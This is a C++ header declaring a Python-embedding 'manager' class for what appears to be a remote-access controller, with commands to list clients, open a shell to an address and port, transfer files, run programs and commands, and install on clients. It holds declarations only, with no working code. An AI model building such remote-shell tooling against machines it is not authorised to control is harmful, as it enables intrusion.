#include <vector>
#include <string>
#include <python3.8/Python.h>
#include "pyhelper.hpp"

#define ALL     0

using namespace std;

typedef enum{
    help,
    frontListClients,
    frontPopShell,
    frontSendFile,
    frontReciveFile,
    frontExecProgram,
    frontInstall,
    runComand,
    Exit
}commands;

void ServerLoop(CPyObject *master);

class manager
{
private:
    //global initializer
    CPyInstance hInstancePtr;

    
    CPyObject pModule;
    CPyObject pyAdmin;
    CPyObject master;

public:
   
    manager(/* args */);
    ~manager();

    static void
    Help();

    bool
    FrontListClients();

    bool
    FrontPopShell(int idClient,const char *address, int port);

    void
    FrontSendFile(string fname, unsigned idClient);

    void
    FrontReciveFile(string fname, unsigned idClient);

    void
    FrontExecProgram(string programName, unsigned idCliente);

    void
    FrontInstall(unsigned idCliente);
    void
    runCommand(string cmd,unsigned idCliente);



};


